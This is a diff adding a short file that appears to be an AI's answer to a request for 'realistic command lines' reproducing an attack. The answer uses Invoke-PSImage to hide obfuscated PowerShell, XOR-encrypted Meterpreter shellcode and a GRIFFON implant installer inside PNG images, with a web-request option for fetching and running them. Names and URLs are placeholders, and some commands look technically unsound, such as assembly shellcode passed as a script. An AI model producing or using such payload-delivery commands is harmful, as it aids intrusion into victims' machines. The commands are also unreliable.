@@ -1,0 +1,12 @@
+Based on the attack description, I will generate realistic command lines using only the tool Invoke-PSImage to reproduce the following attack behavior:
+
+An obfuscated PowerShell script and XOR-encrypted Meterpreter shellcode are downloaded into the victim's environment. Pushing a GRIFFON implant installer to the victim's workstation, which involves transferring files into the target system.
+
+Here is the output:
+```
+Command: `Import-Module .\Invoke-PSImage.ps1`
+Command: `Invoke-PSImage -Script <obfuscated_powershell_script.ps1> -Out <griffon_payload.png> -WebRequest`
+Command: `Invoke-PSImage -Script <xor_encrypted_meterpreter_shellcode.asm> -Out <meterpreter_payload.png> -WebRequest`
+Command: `Invoke-PSImage -Script .\GRIFFON_Implant_Installer.ps1 -Out <installer_payload.png> -Image <existing_image.jpg> -WebRequest`
+```
+Please note that I have used placeholders for the actual file names and URLs, as per the provided guidance.
